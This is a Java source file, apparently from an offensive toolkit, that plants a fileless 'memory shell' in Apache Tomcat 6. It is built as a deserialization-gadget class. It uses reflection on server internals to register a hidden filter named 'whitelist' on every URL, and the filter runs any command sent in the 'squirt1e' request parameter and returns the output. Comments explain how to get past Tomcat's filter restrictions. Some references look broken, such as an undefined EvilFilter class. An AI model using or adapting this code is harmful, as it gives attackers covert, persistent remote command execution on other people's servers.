package gadget.memshell;

import com.sun.jmx.mbeanserver.NamedObject;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.core.ApplicationFilterConfig;
import org.apache.catalina.core.StandardContext;
import org.apache.catalina.core.StandardEngine;
import org.apache.catalina.core.StandardHost;
import org.apache.catalina.deploy.FilterDef;
import org.apache.catalina.deploy.FilterMap;
import org.apache.catalina.loader.WebappLoader;
import sun.misc.BASE64Decoder;
import util.GadgetUtils;
import util.ReflectionUtils;
import util.SerializerUtils;

import javax.servlet.*;
import java.io.FilterOutputStream;
import java.io.IOException;
import java.lang.reflect.*;
import java.util.*;


/**
 * @author squirt1e
 * @support version tomcat 6
 */
public class Tomcat6ShellInject extends AbstractTranslet implements Filter {

    /**
     * webshell命令参数名
     */
    private final String cmdParamName = "squirt1e";
    /**
     * 建议针对相应业务去修改filter过滤的url pattern
     */
    private final static String filterUrlPattern = "/*";
    private final static String filterName = "whitelist";

    String uri;
    String serverName;
    private StandardContext standardContext;

    public Object getField(Object object, String fieldName) {
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {

                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException | IllegalAccessException e) {
                // field不存在，错误不抛出，测试时可以抛出
            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    public Tomcat6ShellInject() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, IOException, NoSuchFieldException, InstantiationException {
        this.getUriAndServername();
        StandardContext standardContext = newGet();
        System.out.println(standardContext);
        if (standardContext != null) {
//            System.out.println(111);
//            System.out.println(standardContext);
            try {
                Constructor filterDefConstructor = org.apache.catalina.deploy.FilterDef.class.getConstructor(new Class[]{});
                org.apache.catalina.deploy.FilterDef filterDef = (org.apache.catalina.deploy.FilterDef) filterDefConstructor.newInstance();
                filterDef.setFilterName(filterName);
                Method addFilterDef = standardContext.getClass().getMethod("addFilterDef", org.apache.catalina.deploy.FilterDef.class);
                addFilterDef.invoke(standardContext, filterDef);

//                Filter squirt1e = new Tomcat6ShellInject();
//                filterDef.setFilterClass(Tomcat6ShellInject.getClass().getName());

                if (filterDef.getParameterMap().get("encoding") != null) {
                    filterDef.addInitParameter("encoding", "utf-8");
                }
                Constructor filterMapConstructor = org.apache.catalina.deploy.FilterMap.class.getConstructor(new Class[]{});
                org.apache.catalina.deploy.FilterMap filterMap = (org.apache.catalina.deploy.FilterMap) filterMapConstructor.newInstance();
                filterMap.setFilterName(filterDef.getFilterName());
                filterMap.setDispatcher("REQUEST");
                filterMap.addURLPattern("/*");
                Method addFilterMap = standardContext.getClass().getDeclaredMethod("addFilterMap", org.apache.catalina.deploy.FilterMap.class);
                addFilterMap.invoke(standardContext, filterMap);

                //创建一个filterConfig,因为tomcat6在new ApplicationFilterConfig的时候会由于到不到我们的恶意类而报错not found class，因此需要先创建一个存在的filterConfig，然后反射修改
                org.apache.catalina.deploy.FilterDef tmpFilterDef = (org.apache.catalina.deploy.FilterDef) filterDefConstructor.newInstance();
                tmpFilterDef.setFilterClass("org.apache.catalina.ssi.SSIFilter");
                tmpFilterDef.setFilterName(filterName);

                Class clz = Class.forName("org.apache.catalina.core.ApplicationFilterConfig");
                Constructor applicationFilterConfigConstructor = clz.getDeclaredConstructor(Context.class, org.apache.catalina.deploy.FilterDef.class);
                applicationFilterConfigConstructor.setAccessible(true);
                //filterConfig实例化之前由于org.apache.catalina.ssi.SSIFilter是被限制的类，不能放入ApplicationFilterConfig中，因此要反射修改限制条件
                Properties properties = new Properties();
                properties.put("org.apache.catalina.ssi.SSIFilter", "123");

                Field restrictedFiltersField = clz.getDeclaredField("restrictedFilters");
                restrictedFiltersField.setAccessible(true);
                restrictedFiltersField.set(null, properties);

                Field context = clz.getDeclaredField("context");        //该类是default，只能反射
                context.setAccessible(true);
                context.set(null, standardContext);

                Field applicationFilterConfigfilterDef = clz.getDeclaredField("filterDef");
                applicationFilterConfigfilterDef.setAccessible(true);
                applicationFilterConfigfilterDef.set(clz, tmpFilterDef);

                //用假的org.apache.catalina.ssi.SSIFilter创建一个filterConfig
//                ApplicationFilterConfig filterConfig= (ApplicationFilterConfig) applicationFilterConfigConstructor.newInstance(standardContext,tmpFilterDef);
                //反射将filterConfig的filter从org.apache.catalina.ssi.SSIFilter替换为我们的恶意filter
                Field filterField = clz.getClass().getDeclaredField("filter");
                filterField.setAccessible(true);
                filterField.set(clz, new EvilFilter());

                //将假的filterDef替换为恶意类的filterDef对象
                Field filterDefField = clz.getClass().getDeclaredField("filterDef");
                filterDefField.setAccessible(true);
                filterDefField.set(clz, filterDef);
                //将filterConfig反射添加到StandardContext中
                Field filterConfigsField = org.apache.catalina.core.StandardContext.class.getDeclaredField("filterConfigs");
                filterConfigsField.setAccessible(true);
                HashMap filterConfigs = (HashMap) filterConfigsField.get(standardContext);
                filterConfigs.put(filterName, clz);
                filterConfigsField.set(standardContext, filterConfigs);
            } catch (NoSuchMethodException ex) {
                ex.printStackTrace();
            } catch (IllegalAccessException ex) {
                ex.printStackTrace();
            } catch (InvocationTargetException ex) {
                ex.printStackTrace();
            } catch (InstantiationException ex) {
                ex.printStackTrace();
            } catch (NoSuchFieldException ex) {
                ex.printStackTrace();
            }


        }

    }

    public void getUriAndServername() {
        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
        Object object;
        for (Thread thread : threads) {

            if (thread == null) {
                continue;
            }
            if (thread.getName().contains("exec")) {
                continue;
            }
            Object target = this.getField(thread, "target");
            if (!(target instanceof Runnable)) {
                continue;
            }

            try {
                object = getField(getField(getField(target, "this$0"), "handler"), "global");
            } catch (Exception e) {
                continue;
            }
            if (object == null) {
                continue;
            }
            java.util.ArrayList processors = (java.util.ArrayList) getField(object, "processors");
            Iterator iterator = processors.iterator();
            while (iterator.hasNext()) {
                Object next = iterator.next();

                Object req = getField(next, "req");
                Object serverPort = getField(req, "serverPort");
                if (serverPort.equals(-1)) {
                    continue;
                }
                // 不是对应的请求时，serverPort = -1
                org.apache.tomcat.util.buf.MessageBytes serverNameMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "serverNameMB");
                this.serverName = (String) getField(serverNameMB, "strValue");
                if (this.serverName == null) {
                    this.serverName = serverNameMB.toString();
                }
                if (this.serverName == null) {
                    this.serverName = serverNameMB.getString();
                }

                org.apache.tomcat.util.buf.MessageBytes uriMB = (org.apache.tomcat.util.buf.MessageBytes) getField(req, "decodedUriMB");
                this.uri = (String) getField(uriMB, "strValue");
                if (this.uri == null) {
                    this.uri = uriMB.toString();
                }
                if (this.uri == null) {
                    this.uri = uriMB.getString();
                }
            }
        }
    }

    public StandardContext newGet() {
        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
            if ((thread.getName().contains("Acceptor")) && (thread.getName().contains("http"))) {
                Object target = this.getField(thread, "target");
                HashMap children;
                Object jioEndPoint = null;
                try {
                    jioEndPoint = getField(target, "this$0");
                }catch (Exception e){}
                if (jioEndPoint == null){
                    try{
                        jioEndPoint = getField(target, "endpoint");
                    }catch (Exception e){ return null; }
                }
                Object service = getField(getField(getField(getField(getField(jioEndPoint, "handler"), "proto"), "adapter"), "connector"), "service");
                StandardEngine engine = null;
                try {
                    engine = (StandardEngine) getField(service, "container");
                }catch (Exception e){}
                if (engine == null){
                    engine = (StandardEngine) getField(service, "engine");
                }

                children = (HashMap) getField(engine, "children");
                StandardHost standardHost = (StandardHost) children.get(this.serverName);

                children = (HashMap) getField(standardHost, "children");
                Iterator iterator = children.keySet().iterator();
                while (iterator.hasNext()){
                    String contextKey = (String) iterator.next();
                    if (!(this.uri.startsWith(contextKey))){continue;}
                    StandardContext standardContext = (StandardContext) children.get(contextKey);
                    this.standardContext = standardContext;
                    return standardContext;
                }
            }
        }
        return null;
    }


    public StandardContext getStandardContext() {
        Thread[] threads = (Thread[]) this.getField(Thread.currentThread().getThreadGroup(), "threads");
        Object object;
//        System.out.println(threads);
        for (Thread thread : threads) {
            if (thread == null) {
                continue;
            }
//            System.out.println(thread.getName());
            // 过滤掉不相关的线程
            if (!thread.getName().contains("StandardEngine")) {
                continue;
            }
            System.out.println(123);
            Object target = this.getField(thread, "target");
            System.out.println("---------------------------------------------------------");
            System.out.println(target);
            if (target == null) { continue; }
            HashMap children;

            try {
                children = (HashMap) getField(getField(target, "this$0"), "children");
                StandardHost standardHost = (StandardHost) children.get(this.serverName);
                children = (HashMap) getField(standardHost, "children");
                Iterator iterator = children.keySet().iterator();
                System.out.println("1");
                while (iterator.hasNext()){
                    String contextKey = (String) iterator.next();
                    if (!(this.uri.startsWith(contextKey))){continue;}
                    // /spring_mvc/home/index startsWith /spring_mvc
                    StandardContext standardContext = (StandardContext) children.get(contextKey);
                    this.standardContext = standardContext;
//                    System.out.println("2");
                    if(standardContext!=null){
                        System.out.println(this.standardContext);
//                        System.out.println("3");
//                        Runtime.getRuntime().exec("calc");
                    }else {
                        System.out.println("no standard");
//                        System.out.println("4");
//                        Runtime.getRuntime().exec("calc");
                    }

                    // 添加内存马
                    return standardContext;
                }
            } catch (Exception e) {
                continue;
            }
            if (children == null) {
                continue;
            }
        }
        return null;
    }





//    public StandardContext getStandardContext() {
//        try{
//            org.apache.catalina.loader.WebappClassLoaderBase contextClassLoader = (org.apache.catalina.loader.WebappClassLoaderBase) java.lang.Thread.currentThread().getContextClassLoader();
//            org.apache.catalina.WebResourceRoot resources = contextClassLoader.getResources();
//            return (org.apache.catalina.core.StandardContext) resources.getContext();
//        }catch(Exception e){return null;}
//    }




    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler)
            throws TransletException {

    }
    @Override
    public void init(FilterConfig filterConfig) throws ServletException {

    }

    @Override
    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse,
                         FilterChain filterChain) throws IOException, ServletException {
        System.out.println(
                "TomcatShellInject doFilter.....................................................................");
        String cmd;
        if ((cmd = servletRequest.getParameter(cmdParamName)) != null) {
            Process process = Runtime.getRuntime().exec(cmd);
            java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                    new java.io.InputStreamReader(process.getInputStream()));
            StringBuilder stringBuilder = new StringBuilder();
            String line;
            while ((line = bufferedReader.readLine()) != null) {
                stringBuilder.append(line + '\n');
            }
            servletResponse.getOutputStream().write(stringBuilder.toString().getBytes());
            servletResponse.getOutputStream().flush();
            servletResponse.getOutputStream().close();
            return;
        }
        filterChain.doFilter(servletRequest, servletResponse);
    }

    @Override
    public void destroy() {

    }

}
